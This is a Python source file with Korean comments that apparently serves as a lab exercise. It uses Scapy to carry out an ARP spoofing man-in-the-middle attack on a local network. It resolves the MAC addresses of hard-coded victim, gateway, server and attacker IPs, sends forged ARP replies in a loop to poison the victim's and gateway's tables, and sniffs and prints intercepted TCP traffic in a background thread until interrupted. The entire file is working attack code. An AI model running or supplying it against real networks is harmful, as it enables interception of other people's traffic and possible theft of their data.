from time import sleep
from scapy.all import *
from scapy.layers.l2 import Ether, ARP
from scapy.layers.inet import IP, TCP
import threading


# 목표 IP 주소들
gatewayip = "172.30.1.254"
victimip = "172.30.1.23"
serverip = "172.30.1.1"
attackerip = "172.30.1.96"


# IP 주소에 대응하는 MAC 주소를 가져오는 함수
def getMAC(ip):
    print("\n[{}] MAC 알아내는 중..".format(ip))
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=5, retry=3)
    for s, r in ans:
        return r.sprintf("%Ether.src%")


# IP 주소에 대응하는 MAC 주소들을 가져옴
victimmac = getMAC(victimip)
gatewaymac = getMAC(gatewayip)
attackermac = getMAC(attackerip)
servermac = getMAC(serverip)


# ARP Spoofing을 통해 피해자를 공격하는 함수
def poisonARP(srcip, targetip, targetmac):
    arp = ARP(op=2, psrc=srcip, pdst=targetip, hwdst=targetmac)
    send(arp)


# ARP 테이블을 복원하는 함수
def restoreARP():
    print("\n============================================================")
    print("테이블 정상화")
    arp1 = ARP(
        op=2, pdst=victimip, psrc=gatewayip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gatewaymac
    )
    arp2 = ARP(
        op=2, pdst=gatewayip, psrc=victimip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimmac
    )
    send(arp1, count=3)
    send(arp2, count=3)


# 수정된 패킷을 전송하는 함수
def send_modified_packet(srcip, dstip):
    # 생성할 패킷의 헤더 정보 설정
    ether = Ether(src=attackermac, dst=gatewaymac)
    ip = IP(src=srcip, dst=dstip)
    tcp = TCP()

    # 생성한 패킷 전송
    packet = ether / ip / tcp
    sendp(packet, verbose=0)


# 패킷을 가로채고 처리하는 함수
def packet_handler(packet):
    if packet.haslayer(IP) and packet.haslayer(TCP):
        print(packet.summary())
        # packet.show()
        # if packet[IP].src == serverip and packet[IP].dst == victimip:
        #     # 서버에서 피해자로 가는 패킷을 가로채고 처리
        #     print("서버에서 피해자로 가는 패킷을 가로채고 처리:", packet.summary())
        #     # 추가로 적절한 처리 수행
        #     # 예시: 패킷을 피해자로 전송
        #     send(packet, verbose=0)

        # elif packet[IP].src == victimip and packet[IP].dst == serverip:
        #     # 피해자에서 서버로 가는 패킷을 가로채고 처리
        #     print("피해자에서 서버로 가는 패킷을 가로채고 처리:", packet.summary())
        #     # 추가로 적절한 처리 수행
        #     # 예시: 패킷을 서버로 전송
        #     send(packet, verbose=0)


# 패킷 스니핑을 수행하는 함수
def packet_sniffer():
    try:
        sniff(prn=packet_handler, filter="ip")
    except KeyboardInterrupt:
        print("패킷 스니핑 종료")


# ARP Spoofing을 실행하는 메인 함수
def main():
    if victimmac is None or gatewaymac is None:
        print("MAC 주소를 찾을 수 없습니다.")
        return
    print("\n============================================================")
    print("네트워크 정보")
    print("공격자 IP: {}  MAC: {}".format(attackerip, attackermac))
    print("피해자 IP: {}  MAC: {}".format(victimip, victimmac))
    print("서버 IP: {}  MAC: {}".format(serverip, servermac))
    print("게이트웨이 IP: {}  MAC: {}".format(gatewayip, gatewaymac))

    print("\n============================================================")
    print("ARP Sniffing 시작\nVICTIM IP [%s]\n\n오염된 테이블" % victimip)
    print("[%s]:POISON ARP Table [%s] => [%s]" % (victimip, gatewaymac, attackermac))
    print("[%s]:POISON ARP Table [%s] => [%s]" % (gatewayip, attackermac, gatewaymac))

    print("\n============================================================")

    # 패킷 스니핑 스레드 시작
    sniff_thread = threading.Thread(target=packet_sniffer)
    sniff_thread.daemon = True  # 데몬 스레드로 설정
    sniff_thread.start()

    try:
        while True:
            poisonARP(gatewayip, victimip, victimmac)
            poisonARP(victimip, gatewayip, gatewaymac)

            sleep(3)
    except KeyboardInterrupt:
        restoreARP()
        print("ARP Spoofing 종료 -> RESTORED ARP Table")


if __name__ == "__main__":
    main()
